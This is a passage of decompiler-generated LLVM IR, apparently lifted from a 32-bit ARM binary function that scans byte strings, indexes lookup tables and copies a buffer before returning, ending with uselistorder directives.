  %v0_c7a8 = phi i32 [ %v1_c7a4, %dec_label_pc_c794 ], [ %v1_c7a4, %dec_label_pc_c780 ], [ %v2_c7a4, %bb150 ]
  %v1_c7a8 = inttoptr i32 %v0_c7a8 to i8*
  %v2_c7a8 = load i8, i8* %v1_c7a8, align 1
  %v3_c7a8 = zext i8 %v2_c7a8 to i32
  store i32 %v3_c7a8, i32* %r2.global-to-local, align 4
  %v1_c7ac = add i32 %v0_c7ac, 9
  %v2_c7ac = inttoptr i32 %v1_c7ac to i8*
  %v3_c7ac = load i8, i8* %v2_c7ac, align 1
  %v4_c7ac = zext i8 %v3_c7ac to i32
  store i32 %v4_c7ac, i32* %r3.global-to-local, align 4
  %v2_c7b0 = icmp eq i8 %v2_c7a8, 0
  %v3_c7b4 = mul nuw nsw i32 %v4_c7ac, 256
  store i32 %v3_c7b4, i32* @ip, align 4
  br i1 %v2_c7b0, label %dec_label_pc_ca14, label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %.thread24
  store i32 -38812, i32* %r3.global-to-local, align 4
  %v2_c7c0 = add i32 %v0_c75c, -38812
  store i32 %v2_c7c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c7c4

dec_label_pc_c7c4:                                ; preds = %dec_label_pc_c848, %dec_label_pc_c7bc
  %v1_c7d8 = phi i32 [ %v1_c848, %dec_label_pc_c848 ], [ %v2_c7c0, %dec_label_pc_c7bc ]
  %v1_c7c4 = inttoptr i32 %v1_c7d8 to i8*
  %v2_c7c4 = load i8, i8* %v1_c7c4, align 1
  %v3_c7c4 = zext i8 %v2_c7c4 to i32
  store i32 %v3_c7c4, i32* %r3.global-to-local, align 4
  %v9_c7c8 = icmp eq i8 %v2_c7c4, %v2_c7a8
  br i1 %v9_c7c8, label %dec_label_pc_c7d0, label %dec_label_pc_c848

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c7c4
  store i32 %v2_c7c0, i32* %r3.global-to-local, align 4
  %v2_c7d8 = sub i32 %v1_c7d8, %v2_c7c0
  store i32 %v2_c7d8, i32* %r1.global-to-local, align 4
  %v7_c7e0 = icmp slt i32 %v2_c7d8, 18
  br i1 %v7_c7e0, label %bb152, label %dec_label_pc_c7e4

dec_label_pc_c7e4:                                ; preds = %dec_label_pc_c7d0
  %v1_c7e4 = and i32 %v3_c7b4, 1024
  %v2_c7e4 = icmp eq i32 %v1_c7e4, 0
  br i1 %v2_c7e4, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_c7e4
  %v2_c7e8 = add i32 %v2_c7d8, -2
  store i32 %v2_c7e8, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_c7d0, %dec_label_pc_c7e4, %bb151
  %v0_c7f0 = phi i32 [ %v2_c7d8, %dec_label_pc_c7d0 ], [ %v2_c7d8, %dec_label_pc_c7e4 ], [ %v2_c7e8, %bb151 ]
  store i32 -38860, i32* %r3.global-to-local, align 4
  %v1_c7f0 = load i32, i32* %r7.global-to-local, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 32
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7f0, i32* %v3_c7f0, align 4
  %v0_c7f4 = load i32, i32* @lr, align 4
  %v1_c7f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_c7f4 = add i32 %v1_c7f4, %v0_c7f4
  store i32 %v2_c7f4, i32* %r3.global-to-local, align 4
  %v1_c7f8 = add i32 %v2_c7f4, -1
  store i32 %v1_c7f8, i32* %r0.global-to-local, align 4
  %v0_c800.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c7fc

dec_label_pc_c7fc:                                ; preds = %dec_label_pc_c7fc, %bb152
  %v0_c7fc = phi i32 [ %v1_c7fc, %dec_label_pc_c7fc ], [ %v1_c7f8, %bb152 ]
  %v1_c7fc = add i32 %v0_c7fc, 1
  %v2_c7fc = inttoptr i32 %v1_c7fc to i8*
  %v3_c7fc = load i8, i8* %v2_c7fc, align 1
  %v4_c7fc = zext i8 %v3_c7fc to i32
  store i32 %v4_c7fc, i32* %r3.global-to-local, align 4
  store i32 %v1_c7fc, i32* %r0.global-to-local, align 4
  %v8_c804 = icmp sgt i32 %v0_c800.pre, %v4_c7fc
  br i1 %v8_c804, label %dec_label_pc_c7fc, label %dec_label_pc_c808

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7fc
  %v2_c810.neg = sub i32 38860, %v0_c7f4
  %v2_c814 = add i32 %v2_c810.neg, %v1_c7fc
  %v2_c818 = mul i32 %v2_c814, 2
  store i32 %v2_c818, i32* %r2.global-to-local, align 4
  %v2_c81c = add i32 %v0_c7f4, -38876
  store i32 %v2_c81c, i32* %r3.global-to-local, align 4
  %v2_c820 = add i32 %v2_c818, %v2_c81c
  %v3_c820 = inttoptr i32 %v2_c820 to i16*
  %v4_c820 = load i16, i16* %v3_c820, align 2
  %v6_c820 = sext i16 %v4_c820 to i32
  store i32 %v6_c820, i32* %r1.global-to-local, align 4
  %v2_c828 = add i32 %v0_c7f4, -38892
  store i32 %v2_c828, i32* %r3.global-to-local, align 4
  %v2_c82c = add i32 %v2_c818, %v2_c828
  %v3_c82c = inttoptr i32 %v2_c82c to i16*
  %v4_c82c = load i16, i16* %v3_c82c, align 2
  %v6_c82c = sext i16 %v4_c82c to i32
  %v1_c830 = load i32, i32* @ip, align 4
  %v2_c830 = or i32 %v1_c830, %v6_c820
  %v2_c834 = and i32 %v2_c830, %v6_c82c
  store i32 %v2_c834, i32* %r1.global-to-local, align 4
  store i32 -38812, i32* %r3.global-to-local, align 4
  %v2_c83c = add i32 %v0_c7f4, -38812
  store i32 %v2_c83c, i32* %r0.global-to-local, align 4
  store i32 %v2_c834, i32* %stack_var_-72, align 4
  %v0_c860.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c854

dec_label_pc_c848:                                ; preds = %dec_label_pc_c7c4
  %v1_c848 = add i32 %v1_c7d8, 1
  %v2_c848 = inttoptr i32 %v1_c848 to i8*
  %v3_c848 = load i8, i8* %v2_c848, align 1
  %v4_c848 = zext i8 %v3_c848 to i32
  store i32 %v4_c848, i32* %r3.global-to-local, align 4
  store i32 %v1_c848, i32* %r0.global-to-local, align 4
  %v2_c84c = icmp eq i8 %v3_c848, 0
  br i1 %v2_c84c, label %dec_label_pc_c854, label %dec_label_pc_c7c4

dec_label_pc_c854:                                ; preds = %dec_label_pc_c848, %dec_label_pc_c808
  %v0_c860 = phi i32 [ %v0_c860.pre, %dec_label_pc_c808 ], [ %v0_c7a8, %dec_label_pc_c848 ]
  %v0_c85c = phi i32 [ %v1_c830, %dec_label_pc_c808 ], [ %v3_c7b4, %dec_label_pc_c848 ]
  %v0_c854 = load i32, i32* @r4, align 4
  %v1_c854 = and i32 %v0_c854, 4
  %v1_c858 = and i32 %v0_c854, -5
  store i32 %v1_c858, i32* %r3.global-to-local, align 4
  %v1_c85c = and i32 %v0_c85c, 3840
  store i32 %v1_c85c, i32* %r2.global-to-local, align 4
  %v1_c860 = inttoptr i32 %v0_c860 to i8*
  %v2_c860 = load i8, i8* %v1_c860, align 1
  %v3_c860 = zext i8 %v2_c860 to i32
  store i32 %v3_c860, i32* %r1.global-to-local, align 4
  %v2_c864 = or i32 %v1_c858, %v1_c85c
  store i32 %v2_c864, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_c854, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_c870 = load i32, i32* %r7.global-to-local, align 4
  %v2_c870 = add i32 %v1_c870, 20
  %v3_c870 = inttoptr i32 %v2_c870 to i32*
  store i32 %tmp181, i32* %v3_c870, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c878 = load i32, i32* %r1.global-to-local, align 4
  %v1_c878 = load i32, i32* %r7.global-to-local, align 4
  %v2_c878 = add i32 %v1_c878, 12
  %v3_c878 = inttoptr i32 %v2_c878 to i32*
  store i32 %v0_c878, i32* %v3_c878, align 4
  %v0_c87c = load i32, i32* %r7.global-to-local, align 4
  %v1_c87c = add i32 %v0_c87c, 4
  %v2_c87c = inttoptr i32 %v1_c87c to i32*
  %v3_c87c = load i32, i32* @r5, align 4
  store i32 %v3_c87c, i32* %v2_c87c, align 4
  %v4_c87c = add i32 %v0_c87c, 8
  %v5_c87c = inttoptr i32 %v4_c87c to i32*
  %v6_c87c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_c87c, i32* %v5_c87c, align 4
  %v0_c880 = load i32, i32* %r2.global-to-local, align 4
  %v1_c880 = load i32, i32* %r7.global-to-local, align 4
  %v2_c880 = add i32 %v1_c880, 16
  %v3_c880 = inttoptr i32 %v2_c880 to i32*
  store i32 %v0_c880, i32* %v3_c880, align 4
  %v0_c884 = load i32, i32* %r3.global-to-local, align 4
  %v1_c884 = load i32, i32* %r7.global-to-local, align 4
  %v2_c884 = add i32 %v1_c884, 28
  %v3_c884 = inttoptr i32 %v2_c884 to i32*
  store i32 %v0_c884, i32* %v3_c884, align 4
  %v0_c888 = load i32, i32* %r0.global-to-local, align 4
  %v1_c888 = inttoptr i32 %v0_c888 to i8*
  %v2_c888 = load i8, i8* %v1_c888, align 1
  %v3_c888 = zext i8 %v2_c888 to i32
  store i32 %v3_c888, i32* %r2.global-to-local, align 4
  %v2_c88c = icmp eq i8 %v2_c888, 0
  br i1 %v2_c88c, label %dec_label_pc_c894, label %dec_label_pc_c918

dec_label_pc_c894:                                ; preds = %dec_label_pc_c854
  %v0_c894 = load i32, i32* %r6.global-to-local, align 4
  %v1_c894 = inttoptr i32 %v0_c894 to i8*
  %v2_c894 = load i8, i8* %v1_c894, align 1
  %v3_c894 = zext i8 %v2_c894 to i32
  store i32 %v3_c894, i32* %r3.global-to-local, align 4
  %v7_c898 = icmp eq i8 %v2_c894, 109
  br i1 %v7_c898, label %.thread28, label %dec_label_pc_c8ac

.thread28:                                        ; preds = %dec_label_pc_c894
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_c8a0 = load i32, i32* %r7.global-to-local, align 4
  %v3_c8a0 = add i32 %v2_c8a0, 32
  %v4_c8a0 = inttoptr i32 %v3_c8a0 to i32*
  store i32 20, i32* %v4_c8a0, align 4
  %v1_c8a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_c8a4 = load i32, i32* %r7.global-to-local, align 4
  %v3_c8a4 = add i32 %v2_c8a4, 28
  %v4_c8a4 = inttoptr i32 %v3_c8a4 to i32*
  store i32 %v1_c8a4, i32* %v4_c8a4, align 4
  br label %dec_label_pc_c918

dec_label_pc_c8ac:                                ; preds = %dec_label_pc_c894
  store i32 1520, i32* %r3.global-to-local, align 4
  %v0_c8b0 = load i32, i32* @lr, align 4
  %v2_c8b0 = add i32 %v0_c8b0, 1520
  %v3_c8b0 = inttoptr i32 %v2_c8b0 to i32*
  %v4_c8b0 = load i32, i32* %v3_c8b0, align 4
  store i32 %v4_c8b0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_c8b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_c8b8 = add i32 %v1_c8b8, 32
  %v3_c8b8 = inttoptr i32 %v2_c8b8 to i32*
  store i32 21, i32* %v3_c8b8, align 4
  %v0_c8bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_c8bc, i32* @ip, align 4
  %v1_c8c0 = add i32 %v0_c8bc, 10
  store i32 %v1_c8c0, i32* %r0.global-to-local, align 4
  %v0_c8c8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_c8c8 = inttoptr i32 %v0_c8c8.pre to i8*
  br label %dec_label_pc_c8c4

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c908, %dec_label_pc_c8ac
  %v1_c8d4 = phi i32 [ %v1_c908, %dec_label_pc_c908 ], [ %v0_c8bc, %dec_label_pc_c8ac ]
  %v1_c8c4 = inttoptr i32 %v1_c8d4 to i8*
  %v2_c8c4 = load i8, i8* %v1_c8c4, align 1
  %v3_c8c4 = zext i8 %v2_c8c4 to i32
  store i32 %v3_c8c4, i32* %r2.global-to-local, align 4
  %v2_c8c8 = load i8, i8* %v1_c8c8, align 1
  %v3_c8c8 = zext i8 %v2_c8c8 to i32
  store i32 %v3_c8c8, i32* %r3.global-to-local, align 4
  %v9_c8cc = icmp eq i8 %v2_c8c4, %v2_c8c8
  br i1 %v9_c8cc, label %dec_label_pc_c8d4, label %dec_label_pc_c908

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c8c4
  %v2_c8d4 = sub i32 %v1_c8d4, %v0_c8bc
  store i32 %v2_c8d4, i32* %r3.global-to-local, align 4
  %v0_c8dc = load i32, i32* %r7.global-to-local, align 4
  %v1_c8dc = add i32 %v0_c8dc, 4
  store i32 %v1_c8dc, i32* %r0.global-to-local, align 4
  %v0_c8e0 = load i32, i32* @lr, align 4
  %v2_c8e0 = add i32 %v0_c8e0, 14424
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_c8e8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_c8e8, i32* %r2.global-to-local, align 4
  %v4_c8ec = mul i32 %v2_c8d4, 4
  %v5_c8ec = add i32 %v2_c8e0, %v4_c8ec
  %v6_c8ec = inttoptr i32 %v5_c8ec to i32*
  %v7_c8ec = load i32, i32* %v6_c8ec, align 4
  store i32 %v7_c8ec, i32* @ip, align 4
  store i32 51448, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_c8ec)
  %v0_c8f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_c8fc = load i32, i32* %r7.global-to-local, align 4
  %v2_c8fc = add i32 %v1_c8fc, 28
  %v3_c8fc = inttoptr i32 %v2_c8fc to i32*
  store i32 %v0_c8f8, i32* %v3_c8fc, align 4
  %v7_c900 = icmp sgt i32 %v0_c8f8, 5
  br i1 %v7_c900, label %dec_label_pc_ca14, label %dec_label_pc_c918

dec_label_pc_c908:                                ; preds = %dec_label_pc_c8c4
  %v1_c908 = add i32 %v1_c8d4, 1
  store i32 %v1_c908, i32* %r1.global-to-local, align 4
  %v3_c90c = icmp ult i32 %v1_c908, %v1_c8c0
  br i1 %v3_c90c, label %dec_label_pc_c8c4, label %dec_label_pc_ca14

dec_label_pc_c918:                                ; preds = %.thread28, %dec_label_pc_c8d4, %dec_label_pc_c854
  %v0_c918 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_c918, 1
  br i1 %tmp156, label %dec_label_pc_c9c4, label %dec_label_pc_c920

dec_label_pc_c920:                                ; preds = %dec_label_pc_c918
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_c938 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_c924

dec_label_pc_c924:                                ; preds = %dec_label_pc_c9ac, %dec_label_pc_c920
  %v9_c944 = phi i32 [ 0, %dec_label_pc_c920 ], [ %v1_c9b0, %dec_label_pc_c9ac ]
  %v7_c928 = icmp sgt i32 %v9_c944, 2
  br i1 %v7_c928, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_c924
  store i32 %v9_c938, i32* %r3.global-to-local, align 4
  %v10_c944 = add i32 %v9_c944, %v9_c938
  store i32 %v10_c944, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_c924
  store i32 %v3_c5a0.pre-phi, i32* @ip, align 4
  %v12_c92c = mul i32 %v9_c944, 4
  %v13_c92c = add i32 %v12_c92c, %v3_c5a0.pre-phi
  store i32 %v13_c92c, i32* %r3.global-to-local, align 4
  %v9_c934 = add i32 %v13_c92c, -12
  %v10_c934 = inttoptr i32 %v9_c934 to i8*
  %v11_c934 = load i8, i8* %v10_c934, align 4
  %v12_c934 = zext i8 %v11_c934 to i32
  store i32 %v12_c934, i32* %r2.global-to-local, align 4
  %v9_c93c = load i32, i32* %r7.global-to-local, align 4
  %v10_c93c = add i32 %v9_c93c, %v9_c944
  store i32 %v10_c93c, i32* %r3.global-to-local, align 4
  store i32 %v12_c934, i32* %r1.global-to-local, align 4
  %v11_c948 = add i32 %v10_c93c, 36
  %v12_c948 = inttoptr i32 %v11_c948 to i8*
  store i8 %v11_c934, i8* %v12_c948, align 1
  %v0_c94c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_c96c = phi i32 [ %v10_c944, %.thread38 ], [ %v0_c94c.pre, %bb157 ]
  %v1_c94c = load i32, i32* %fp.global-to-local, align 4
  %v2_c94c = sub i32 %v0_c96c, %v1_c94c
  %v4_c94c = xor i32 %v1_c94c, %v0_c96c
  %v5_c94c = xor i32 %v2_c94c, %v0_c96c
  %v6_c94c = and i32 %v5_c94c, %v4_c94c
  %v7_c94c = icmp slt i32 %v6_c94c, 0
  %v8_c94c = icmp slt i32 %v2_c94c, 0
  %v9_c94c = icmp eq i32 %v0_c96c, %v1_c94c
  %v3_c950 = xor i1 %v8_c94c, %v7_c94c
  %v4_c950 = or i1 %v9_c94c, %v3_c950
  br i1 %v4_c950, label %dec_label_pc_c960, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb158
  %v1_c954 = add i32 %v0_c96c, -9
  %v3_c954 = sub i32 8, %v0_c96c
  %v4_c954 = and i32 %v3_c954, %v0_c96c
  %v5_c954 = icmp slt i32 %v4_c954, 0
  %v6_c954 = icmp slt i32 %v1_c954, 0
  %v7_c954 = icmp eq i32 %v0_c96c, 9
  %v3_c958 = xor i1 %v6_c954, %v5_c954
  %v4_c958 = or i1 %v7_c954, %v3_c958
  br i1 %v4_c958, label %dec_label_pc_c95c, label %dec_label_pc_ca14

dec_label_pc_c95c:                                ; preds = %dec_label_pc_c954
  store i32 %v0_c96c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c960

dec_label_pc_c960:                                ; preds = %bb158, %dec_label_pc_c95c
  store i32 %v3_c5a0.pre-phi, i32* @r2, align 4
  %v1_c964 = load i32, i32* %r8.global-to-local, align 4
  %v4_c964 = mul i32 %v1_c964, 4
  %v5_c964 = add i32 %v4_c964, %v3_c5a0.pre-phi
  store i32 %v5_c964, i32* %sb.global-to-local, align 4
  %v1_c968 = add i32 %v5_c964, -40
  %v2_c968 = inttoptr i32 %v1_c968 to i32*
  %v3_c968 = load i32, i32* %v2_c968, align 4
  store i32 %v3_c968, i32* %r5.global-to-local, align 4
  %v1_c96c = add i32 %v0_c96c, -1
  store i32 %v1_c96c, i32* %r3.global-to-local, align 4
  %v0_c970 = load i32, i32* %r7.global-to-local, align 4
  %v4_c970 = mul i32 %v1_c96c, 4
  %v5_c970 = add i32 %v0_c970, %v4_c970
  store i32 %v5_c970, i32* %sl.global-to-local, align 4
  %v7_c974 = icmp eq i32 %v3_c968, 8
  %v1_c978 = add i32 %v5_c970, 40
  %v2_c978 = inttoptr i32 %v1_c978 to i32*
  %v3_c978 = load i32, i32* %v2_c978, align 4
  store i32 %v3_c978, i32* @r0, align 4
  br i1 %v7_c974, label %dec_label_pc_c9ac, label %dec_label_pc_c980

dec_label_pc_c980:                                ; preds = %dec_label_pc_c960
  %v9_c980 = icmp eq i32 %v3_c978, %v3_c968
  br i1 %v9_c980, label %dec_label_pc_c9a4, label %bb159

bb159:                                            ; preds = %dec_label_pc_c980
  %v8_c984 = icmp eq i32 %v3_c978, 8
  br i1 %v8_c984, label %dec_label_pc_c9a4, label %dec_label_pc_c98c

dec_label_pc_c98c:                                ; preds = %bb159
  %v0_c98c = call i32 @_promoted_size()
  %v0_c994 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c994, i32* @r0, align 4
  %v0_c998 = call i32 @_promoted_size()
  store i32 %v0_c998, i32* %r0.global-to-local, align 4
  %v8_c9a0 = icmp sgt i32 %v0_c98c, %v0_c998
  br i1 %v8_c9a0, label %dec_label_pc_c9ac, label %dec_label_pc_c98c.dec_label_pc_c9a4_crit_edge

dec_label_pc_c98c.dec_label_pc_c9a4_crit_edge:    ; preds = %dec_label_pc_c98c
  %v0_c9a4.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_c9a8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_c9a4

dec_label_pc_c9a4:                                ; preds = %dec_label_pc_c98c.dec_label_pc_c9a4_crit_edge, %dec_label_pc_c980, %bb159
  %v1_c9a8 = phi i32 [ %v1_c9a8.pre, %dec_label_pc_c98c.dec_label_pc_c9a4_crit_edge ], [ %v5_c970, %dec_label_pc_c980 ], [ %v5_c970, %bb159 ]
  %v0_c9a4 = phi i32 [ %v0_c9a4.pre, %dec_label_pc_c98c.dec_label_pc_c9a4_crit_edge ], [ %v5_c964, %dec_label_pc_c980 ], [ %v5_c964, %bb159 ]
  %v1_c9a4 = add i32 %v0_c9a4, -40
  %v2_c9a4 = inttoptr i32 %v1_c9a4 to i32*
  %v3_c9a4 = load i32, i32* %v2_c9a4, align 4
  store i32 %v3_c9a4, i32* %r3.global-to-local, align 4
  %v2_c9a8 = add i32 %v1_c9a8, 40
  %v3_c9a8 = inttoptr i32 %v2_c9a8 to i32*
  store i32 %v3_c9a4, i32* %v3_c9a8, align 4
  br label %dec_label_pc_c9ac

dec_label_pc_c9ac:                                ; preds = %dec_label_pc_c98c, %dec_label_pc_c960, %dec_label_pc_c9a4
  %v0_c9ac = load i32, i32* %r7.global-to-local, align 4
  %v1_c9ac = add i32 %v0_c9ac, 28
  %v2_c9ac = inttoptr i32 %v1_c9ac to i32*
  %v3_c9ac = load i32, i32* %v2_c9ac, align 4
  %v0_c9b0 = load i32, i32* %r8.global-to-local, align 4
  %v1_c9b0 = add i32 %v0_c9b0, 1
  store i32 %v1_c9b0, i32* %r8.global-to-local, align 4
  %v1_c9b4 = add i32 %v3_c9ac, 2
  store i32 %v1_c9b4, i32* %r3.global-to-local, align 4
  %v6_c9bc = icmp slt i32 %v1_c9b0, %v1_c9b4
  br i1 %v6_c9bc, label %dec_label_pc_c924, label %dec_label_pc_c9e0

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_c918
  %v0_c9c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_c9c4 = add i32 %v0_c9c4, 28
  %v2_c9c4 = inttoptr i32 %v1_c9c4 to i32*
  %v3_c9c4 = load i32, i32* %v2_c9c4, align 4
  store i32 %v3_c9c4, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_c9cc = add i32 %v0_c9c4, 38
  %v4_c9cc = inttoptr i32 %v3_c9cc to i8*
  store i8 1, i8* %v4_c9cc, align 1
  %v0_c9d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9d0 = mul i32 %v0_c9d0, 4
  store i32 %v3_c9d0, i32* @r2, align 4
  %v0_c9d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_c9d4 = add i32 %v0_c9d4, 40
  store i32 %v1_c9d4, i32* @r0, align 4
  %v2_c9d8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_c9d8, i32* @r1, align 4
  %v0_c9dc = call i32 @memcpy()
  store i32 %v0_c9dc, i32* %r0.global-to-local, align 4
  %v0_c9e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c9e0

dec_label_pc_c9e0:                                ; preds = %dec_label_pc_c9ac, %dec_label_pc_c9c4
  %v2_c9fc = phi i32 [ %v0_c9e0.pre, %dec_label_pc_c9c4 ], [ %v0_c9ac, %dec_label_pc_c9ac ]
  %v1_c9e0 = add i32 %v2_c9fc, 16
  %v2_c9e0 = inttoptr i32 %v1_c9e0 to i32*
  %v3_c9e0 = load i32, i32* %v2_c9e0, align 4
  store i32 %v3_c9e0, i32* %r3.global-to-local, align 4
  %v1_c9e4 = and i32 %v3_c9e0, 128
  %v2_c9e4 = icmp eq i32 %v1_c9e4, 0
  br i1 %v2_c9e4, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_c9e0
  %v3_c9e8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_c9e8, i32* %r3.global-to-local, align 4
  %v2_c9ec = inttoptr i32 %v2_c9fc to i32*
  %v3_c9ec = load i32, i32* %v2_c9ec, align 4
  %v2_c9f4.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_c9f4 = sub i32 %v2_c9f4.pre, %v3_c9e8
  store i32 %v3_c9f4, i32* %r3.global-to-local, align 4
  %v5_c9f8 = mul i32 %v3_c9f4, 4
  %v6_c9f8 = add i32 %v5_c9f8, %v3_c9ec
  store i32 %v6_c9f8, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_c9e0
  %v1_c9f045 = load i32, i32* %r6.global-to-local, align 4
  %v2_c9f046 = add i32 %v1_c9f045, 1
  store i32 %v2_c9f046, i32* %r3.global-to-local, align 4
  %v3_c9fc = inttoptr i32 %v2_c9fc to i32*
  store i32 %v2_c9f046, i32* %v3_c9fc, align 4
  %v0_ca00.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_ca08 = phi i32 [ %v2_c9fc, %.thread48 ], [ %v0_ca00.pre, %.thread50 ]
  %v1_ca00 = add i32 %v1_ca08, 28
  %v2_ca00 = inttoptr i32 %v1_ca00 to i32*
  %v3_ca00 = load i32, i32* %v2_ca00, align 4
  store i32 %v3_ca00, i32* %r3.global-to-local, align 4
  %v1_ca04 = add i32 %v3_ca00, 2
  store i32 %v1_ca04, i32* %r0.global-to-local, align 4
  %v0_ca08 = load i32, i32* %fp.global-to-local, align 4
  %v2_ca08 = add i32 %v1_ca08, 24
  %v3_ca08 = inttoptr i32 %v2_ca08 to i32*
  store i32 %v0_ca08, i32* %v3_ca08, align 4
  br i1 %v2_c9e4, label %dec_label_pc_ca18, label %bb161

bb161:                                            ; preds = %bb160
  %v1_ca0c = load i32, i32* @r2, align 4
  %v2_ca0c = load i32, i32* %r7.global-to-local, align 4
  %v3_ca0c = inttoptr i32 %v2_ca0c to i32*
  store i32 %v1_ca0c, i32* %v3_ca0c, align 4
  br label %dec_label_pc_ca18

dec_label_pc_ca14:                                ; preds = %dec_label_pc_c908, %dec_label_pc_c528, %dec_label_pc_c670, %dec_label_pc_c71c, %dec_label_pc_c6f4, %dec_label_pc_c700, %dec_label_pc_c63c, %dec_label_pc_c954, %dec_label_pc_c8d4, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ca18

dec_label_pc_ca18:                                ; preds = %bb161, %bb160, %dec_label_pc_ca14
  %v2_ca1c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ca1c, i32* @r4, align 4
  store i32 %v6_c4e4, i32* @r5, align 4
  store i32 %v27_c4e4, i32* @lr, align 4
  %v1_ca20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_ca20

; uselistorder directives
  uselistorder i32 %v3_c9f4, { 1, 0 }
  uselistorder i32 %v1_c9b0, { 1, 2, 0 }
  uselistorder i32 %v2_c94c, { 1, 0 }
  uselistorder i32 %v1_c94c, { 1, 0, 2 }
  uselistorder i32 %v0_c96c, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_c944, { 0, 2, 1, 3 }
  uselistorder i32 %v1_c908, { 1, 2, 0 }
  uselistorder i32 %v0_c8f8, { 1, 0 }
  uselistorder i32 %v1_c8d4, { 1, 0, 2 }
  uselistorder i32 %v1_c848, { 1, 2, 0 }
  uselistorder i32 %v1_c830, { 1, 0 }
  uselistorder i32 %v2_c818, { 2, 1, 0 }
  uselistorder i32 %v1_c7fc, { 0, 2, 3, 1 }
  uselistorder i32 %v0_c7f4, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_c7d8, { 1, 0, 2 }
  uselistorder i32 %v2_c7c0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_c7b4, { 2, 1, 0 }
  uselistorder i32 %v1_c774, { 0, 2, 3, 1 }
  uselistorder i32 %v0_c764.pre, { 0, 2, 1 }
  uselistorder i32 %v2_c740, { 1, 0 }
  uselistorder i32 %v5_c6a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c6a0, { 1, 0 }
  uselistorder i32 %v0_c6a476, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_c648, { 1, 0 }
  uselistorder i32 %v0_c668, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_c62c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_c614, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_c604, { 1, 0 }
  uselistorder i32 %v3_c5fc, { 0, 2, 1 }
  uselistorder i8 %v2_c5fc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_c67c, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_c5c0, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_c5ac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_c594, { 1, 0 }
  uselistorder i32 %v3_c5a0.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_c548, { 0, 2, 1 }
  uselistorder i32 %v2_c534, { 1, 0, 2 }
  uselistorder i32 %v0_c4e8, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 1, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
